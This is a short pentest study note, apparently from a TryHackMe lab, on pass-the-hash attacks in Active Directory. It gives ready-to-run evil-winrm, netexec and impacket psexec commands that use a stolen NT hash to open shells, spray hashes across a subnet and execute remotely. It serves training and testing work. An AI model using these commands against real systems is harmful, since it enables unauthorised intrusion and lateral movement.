---
tags: [active-directory, credentials, lateral]
tools: [evil-winrm, netexec, impacket]
ports: [445, 5985]
os: [windows]
phase: [lateral, initial-access]
---
# AD - Pass-the-hash

**TL;DR:** NTLM auth doesn't need the plaintext — the **NT hash is enough**. Crack nothing: pass the hash to log in, run commands, or spray it across hosts.

from: TryHackMe Attacktive Directory — verified vs evil-winrm / netexec docs

## When to use

You have an NT hash (from [[AD - DCSync]] or a SAM dump) but not the password.

## How

```bash
# Interactive shell over WinRM
evil-winrm -i <IP> -u <USER> -H <NTHASH>
# Validate / spray a hash across hosts (which boxes accept it?)
nxc smb <SUBNET> -u <USER> -H <NTHASH>
# Remote exec
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
```

## Gotchas

- Use only the **NT** half; `:` then the NT hash (LM is usually blank/`aad3b...`).
- A service account's hash may not grant WinRM — needs the account in Remote Management Users. Administrator usually works.

## Related

- [[AD - DCSync]], [[Tool - netexec]]
